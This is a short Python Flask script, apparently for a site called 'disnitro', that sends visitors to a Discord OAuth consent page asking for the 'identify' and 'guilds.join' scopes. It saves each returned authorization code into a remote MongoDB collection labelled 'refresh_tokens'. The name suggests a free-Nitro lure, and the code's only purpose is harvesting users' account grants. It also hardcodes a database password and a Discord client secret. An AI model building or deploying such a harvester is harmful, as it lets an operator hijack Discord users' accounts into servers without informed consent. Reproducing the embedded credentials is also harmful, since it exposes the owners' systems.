import pymongo
import requests
from flask import Flask, redirect, request, render_template
from pymongo import MongoClient

cluster = MongoClient("mongodb+srv://disnitro:kGVppDJHrixqKVWd@cluster0.juv3x.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")

db1 = cluster["disnitro"]
refresh_tokensdb = db1["refresh_tokens"]

API_ENDPOINT = 'https://discord.com/api/v8'
CLIENT_ID = '968533232385658890'
CLIENT_SECRET = 'GOD0QQ9lw5mRK3G3quwFTWGVMxQi-K7L'

app = Flask(__name__)

@app.route("/")
def home():
  return redirect("https://discord.com/api/oauth2/authorize?response_type=code&client_id=968533232385658890&scope=identify%20guilds.join&state=15773059ghq9183habn&redirect_uri=https%3A%2F%2Fdisnitro.xyz/callback&prompt=consent", code=302)

@app.route("/callback")
def callback():
  refreshtoken = request.args.get("code")
  refresh_tokensdb.insert_one({"_id": refreshtoken})
  return redirect("https://discord.com/oauth2/authorized")


if __name__ == "__main__":
  app.run(debug=False, host='0.0.0.0')